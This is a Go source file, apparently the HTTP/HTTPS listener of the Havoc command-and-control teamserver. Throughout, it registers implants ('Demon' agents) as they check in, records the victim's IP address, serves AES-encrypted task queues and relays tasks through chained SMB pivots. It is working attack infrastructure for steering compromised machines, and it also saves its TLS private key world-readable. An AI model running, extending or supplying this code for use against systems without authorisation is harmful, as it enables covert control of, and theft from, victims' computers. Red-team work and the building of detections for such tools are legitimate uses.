package handlers

import (
	"context"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"math/bits"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"Havoc/pkg/agent"
	"Havoc/pkg/colors"
	"Havoc/pkg/common/certs"
	"Havoc/pkg/common/packer"
	"Havoc/pkg/common/parser"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"

	"github.com/gin-gonic/gin"
)

func NewConfigHttp() *HTTP {
	var config = new(HTTP)

	config.GinEngine = gin.New()

	return config
}

// Server functions
func (h *HTTP) generateCertFiles() bool {
	var (
		err          error
		ListenerName string
		ListenerPath string
	)

	reg, err := regexp.Compile("[^a-zA-Z0-9]+")
	if err != nil {
		log.Fatal(err)
	}

	ListenerName = reg.ReplaceAllString(h.Config.Name, "")
	ListenerPath = logr.LogrInstance.ListenerPath + "/" + ListenerName + "/"

	logger.Debug("Listener Path:", ListenerPath)

	if _, err := os.Stat(ListenerPath); os.IsNotExist(err) {
		if err = os.Mkdir(ListenerPath, os.ModePerm); err != nil {
			logger.Error("Failed to create Logr listener " + h.Config.Name + " folder: " + err.Error())
			return false
		}
	}

	h.TLS.CertPath = ListenerPath + "server.crt"
	h.TLS.KeyPath = ListenerPath + "server.key"

	h.TLS.Cert, h.TLS.Key, err = certs.HTTPSGenerateRSACertificate(h.Config.Hosts)

	err = os.WriteFile(h.TLS.CertPath, h.TLS.Cert, 0644)
	if err != nil {
		logger.Error("Couldn't save server cert file: " + err.Error())
		return false
	}

	err = os.WriteFile(h.TLS.KeyPath, h.TLS.Key, 0644)
	if err != nil {
		logger.Error("Couldn't save server key file: " + err.Error())
		return false
	}
	logger.Debug("Successful generated tls certifications")
	return true
}

func (h *HTTP) request(ctx *gin.Context) {
	var AgentInstance *agent.Agent

	Body, err := ioutil.ReadAll(ctx.Request.Body)
	if err != nil {
		logger.Debug("Error while reading request: " + err.Error())
	}

	for _, Header := range h.Config.Response.Headers {
		var hdr = strings.Split(Header, ":")
		ctx.Header(hdr[0], hdr[1])
	}

	AgentHeader, err := agent.AgentParseHeader(Body)
	if err != nil {
		logger.Debug("[Error] AgentHeader: " + err.Error())
		ctx.AbortWithStatus(404)
	}

	if AgentHeader.Data.Length() > 4 {

		if AgentHeader.MagicValue == agent.DEMON_MAGIC_VALUE {

			if h.RoutineFunc.AgentExists(AgentHeader.AgentID) {
				logger.Debug("Agent does exists. continue...")
				var Command int

				// get our agent instance based on the agent id
				AgentInstance = h.RoutineFunc.AgentGetInstance(AgentHeader.AgentID)
				Command = AgentHeader.Data.ParseInt32()

				logger.Debug(fmt.Sprintf("Command: %d (%x)", Command, Command))

				if Command == agent.COMMAND_GET_JOB {

					AgentInstance.UpdateLastCallback(h.RoutineFunc)

					if len(AgentInstance.JobQueue) > 0 {
						var (
							job     = AgentInstance.GetQueuedJobs()
							payload = agent.BuildPayloadMessage(job, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
						)

						_, err := ctx.Writer.Write(payload)
						if err != nil {
							logger.Error("Couldn't write to HTTP connection: " + err.Error())
						} else {
							// show bytes for pivot
							var CallbackSizes = make(map[int64][]byte)
							for j := range job {

								if len(job[j].Data) >= 1 {

									if job[j].Command == agent.COMMAND_PIVOT && job[j].Data[0] == agent.DEMON_PIVOT_SMB_COMMAND {
										var (
											TaskBuffer   = job[j].Data[2].([]byte)
											PivotAgentID = int(job[j].Data[1].(int64))
										)

										for {

											var Parser = parser.NewParser(TaskBuffer)

											Parser.SetBigEndian(false)

											var (
												_            = Parser.ParseInt32()
												_            = Parser.ParseInt32()
												CommandID    = Parser.ParseInt32()
												SubCommandID = 0
											)

											if CommandID == agent.COMMAND_PIVOT {
												var PivotInstance = h.RoutineFunc.AgentGetInstance(PivotAgentID)

												if PivotInstance != nil {
													TaskBuffer = Parser.ParseBytes()

													Parser = parser.NewParser(TaskBuffer)
													Parser.DecryptBuffer(PivotInstance.Encryption.AESKey, PivotInstance.Encryption.AESIv)

													if Parser.Length() >= 4 {

														SubCommandID = Parser.ParseInt32()
														SubCommandID = int(bits.ReverseBytes32(uint32(SubCommandID)))

														if SubCommandID == agent.DEMON_PIVOT_SMB_COMMAND {
															PivotAgentID = Parser.ParseInt32()
															PivotAgentID = int(bits.ReverseBytes32(uint32(PivotAgentID)))

															TaskBuffer = Parser.ParseBytes()
															continue
														} else {
															CallbackSizes[int64(PivotAgentID)] = append(CallbackSizes[job[j].Data[1].(int64)], TaskBuffer...)
															break
														}
													}
												} else {
													break
												}
											} else {
												CallbackSizes[int64(PivotAgentID)] = append(CallbackSizes[job[j].Data[1].(int64)], TaskBuffer...)
												break
											}
										}

									} else {
										payload = agent.BuildPayloadMessage([]agent.Job{job[j]}, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
										CallbackSizes[int64(AgentHeader.AgentID)] = append(CallbackSizes[int64(AgentHeader.AgentID)], payload...)
									}
								} else {
									CallbackSizes[int64(AgentHeader.AgentID)] = append(CallbackSizes[int64(AgentHeader.AgentID)], payload...)
								}

							}

							for agentID, bytes := range CallbackSizes {
								agentInstance := h.RoutineFunc.AgentGetInstance(int(agentID))
								if agentInstance != nil {
									h.RoutineFunc.CallbackSize(agentInstance, len(bytes))
								}
							}

							CallbackSizes = nil
						}

					} else {
						var NoJob = []agent.Job{{
							Command: agent.COMMAND_NOJOB,
							Data:    []interface{}{},
						}}

						var Payload = agent.BuildPayloadMessage(NoJob, AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)

						_, err := ctx.Writer.Write(Payload)
						if err != nil {
							logger.Error("Couldn't write to HTTP connection: " + err.Error())
							return
						}
					}
				} else {
					AgentInstance.TaskDispatch(Command, AgentHeader.Data, h.RoutineFunc)
				}

			} else {
				logger.Debug("Agent does not exists. hope this is a register request")

				var (
					Command  = AgentHeader.Data.ParseInt32()
					Packer   *packer.Packer
					Response []byte
				)

				if Command == agent.DEMON_INIT {

					logger.Debug("Is register request. continue...")

					AgentInstance = agent.ParseResponse(AgentHeader.AgentID, AgentHeader.Data)
					if AgentInstance == nil {
						ctx.AbortWithStatus(404)
						return
					}

					go AgentInstance.BackgroundUpdateLastCallbackUI(h.RoutineFunc)

					AgentInstance.Info.ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
					AgentInstance.Info.MagicValue = AgentHeader.MagicValue
					AgentInstance.Info.Listener = h

					h.RoutineFunc.AppendDemon(AgentInstance)

					pk := h.RoutineFunc.EventNewDemon(AgentInstance)
					h.RoutineFunc.EventAppend(pk)
					h.RoutineFunc.EventBroadcast("", pk)

					Packer = packer.NewPacker(AgentInstance.Encryption.AESKey, AgentInstance.Encryption.AESIv)
					Packer.AddUInt32(uint32(AgentHeader.AgentID))

					Response = Packer.Build()

					logger.Debug(fmt.Sprintf("%x", Response))

					_, err = ctx.Writer.Write(Response)
					if err != nil {
						logger.Error(err)
						return
					}

					logger.Debug("Finished request")
				} else {
					logger.Debug("Is not register request. bye...")
					ctx.AbortWithStatus(404)
					return
				}
			}
		} else {

			// TODO: handle 3rd party agent.
			logger.Debug("Is 3rd party agent. I hope...")

			if h.RoutineFunc.ServiceAgentExits(AgentHeader.MagicValue) {
				var AgentData any = nil

				AgentInstance = h.RoutineFunc.AgentGetInstance(AgentHeader.AgentID)
				if AgentInstance != nil {
					AgentData = AgentInstance.ToMap()
					go AgentInstance.BackgroundUpdateLastCallbackUI(h.RoutineFunc)
				}

				// receive message
				Response := h.RoutineFunc.ServiceAgentGet(AgentHeader.MagicValue).SendResponse(AgentData, AgentHeader)
				logger.Debug("Response:\n", hex.Dump(Response))
				_, err = ctx.Writer.Write(Response)
				if err != nil {
					logger.Error(err)
					return
				}
			} else {
				logger.Debug("Alright its not a 3rd party agent request. cya...")
				ctx.AbortWithStatus(404)
				return
			}

		}

		ctx.AbortWithStatus(200)
		return
	}

	ctx.AbortWithStatus(404)
	return
}

func (h *HTTP) Start() {
	logger.Debug("Setup HTTP/s Server")

	logger.Debug(h.Config)

	if h.Config.Name == "" {
		logger.Error("HTTP Name not set")
		return
	}

	h.Config.Headers = append([]string{"Content-type: */*"}, h.Config.Headers...)

	if h.Config.Hosts == "" {
		logger.Error("HTTP Hosts not set")
		return
	}

	if h.Config.Port == "" {
		logger.Error("HTTP Port not set")
		return
	}

	if len(h.Config.Uris) == 0 {
		logger.Error("HTTP Uris not set")
		return
	}

	h.GinEngine.POST("/:endpoint", h.request)
	h.Active = true

	if h.Config.Secure {
		if h.generateCertFiles() {
			logger.Info("Started \"" + colors.Green(h.Config.Name) + "\" listener: " + colors.BlueUnderline("https://"+h.Config.Hosts+":"+h.Config.Port))

			pk := h.RoutineFunc.AppendListener("", LISTENER_HTTP, h)
			h.RoutineFunc.EventAppend(pk)
			h.RoutineFunc.EventBroadcast("", pk)

			go func() {
				h.Server = &http.Server{
					Addr:    h.Config.Hosts + ":" + h.Config.Port,
					Handler: h.GinEngine,
				}

				err := h.Server.ListenAndServeTLS(h.TLS.CertPath, h.TLS.KeyPath)
				if err != nil {
					logger.Error("Couldn't start HTTPs handler: " + err.Error())
					h.Active = false
					h.RoutineFunc.EventListenerError(h.Config.Name, err)
				}
			}()
		} else {
			logger.Error("Failed to generate server tls certifications")
		}
	} else {
		logger.Info("Started \"" + colors.Green(h.Config.Name) + "\" listener: " + colors.BlueUnderline("http://"+h.Config.Hosts+":"+h.Config.Port))

		pk := h.RoutineFunc.AppendListener("", LISTENER_HTTP, h)
		h.RoutineFunc.EventAppend(pk)
		h.RoutineFunc.EventBroadcast("", pk)

		go func() {
			h.Server = &http.Server{
				Addr:    h.Config.Hosts + ":" + h.Config.Port,
				Handler: h.GinEngine,
			}

			err := h.Server.ListenAndServe()
			if err != nil {
				logger.Error("Couldn't start HTTP handler: " + err.Error())
				h.Active = false
				h.RoutineFunc.EventListenerError(h.Config.Name, err)
			}
		}()
	}
}

func (h *HTTP) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := h.Server.Shutdown(ctx); err != nil {
		return err
	}
	// catching ctx.Done(). timeout of 5 seconds.
	select {
	case <-ctx.Done():
		logger.Debug("timeout of 5 seconds.")
	}

	return nil
}
